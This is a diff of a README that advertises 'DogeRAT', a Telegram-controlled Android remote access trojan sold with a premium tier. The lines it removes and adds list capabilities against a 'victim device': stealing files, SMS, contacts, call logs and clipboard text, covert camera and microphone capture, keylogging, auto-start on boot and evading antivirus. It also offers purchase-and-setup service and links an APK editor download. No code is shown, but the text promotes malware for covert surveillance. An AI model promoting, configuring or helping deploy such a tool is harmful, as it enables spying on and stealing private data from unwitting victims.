@@ -10,32 +10,7 @@ A multifunctional Telegram based Android RAT  without port forwarding.
 - VIDEO TUTORIALS AND NEW UPDATES AVIALBLE HERE
 https://shivaya-dav.github.io/dogeweb/
 ## Features
- - Read all the files of Internal Storage
- - Delete files or folder from victim device
- - Download Any Media to your Device from Victims Device
- - Get system information of Victim Device
- - Retrieve the List of Installed Applications
- - Retrive SMS
- - Retrive Call Logs
- - Retrive Contacts
- - Click photos from victim device front/main camera
- - Send SMS
- - Keylogger {not working in android 11 or higher version}
-- Record Audio
-- Pre Binded with [Instagram Webview]
- - Runs In Background 
-    - Auto Starts on restarting the device
- - No port forwarding needed
-
-## Requirements
- - Glitch Account
- - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
-[ApkTool Editor](https://999xprofit.com/dogs/apkeditor.apk) ( for Android)
-
-## RECENTLY WE LAUNCHED DOGERAT PREMIUM {PLEASE CHECK}
-
-## Premium featuers
-- 🔴 Real time
+ - 🔴 Real time
 - 🌐 custom web view
 - 🔔 notification reader
 - 🔔 notification sender (send custom notification that apper on target device with custom click link)
@@ -54,10 +29,15 @@ https://shivaya-dav.github.io/dogeweb/
 - 🎙 capture microphone (with custom duration)
 - 📋 receive last clipboard text
 - ✅️ auto start after device boot
+- 🔐 Keylogger {Availbe in apk v1 and v2}
 - ✨ Beautiful telegram bot interface
 -🤖 Undetectable by antivirus
+## Requirements
+ - Glitch Account
+ - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
+[ApkTool Editor](https://999xprofit.com/dogs/apkeditor.apk) ( for Android)
 
-[![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/shivayadavv)
+
 
 I will setup everything after purchase you don't need to do anything ❤️😁
 
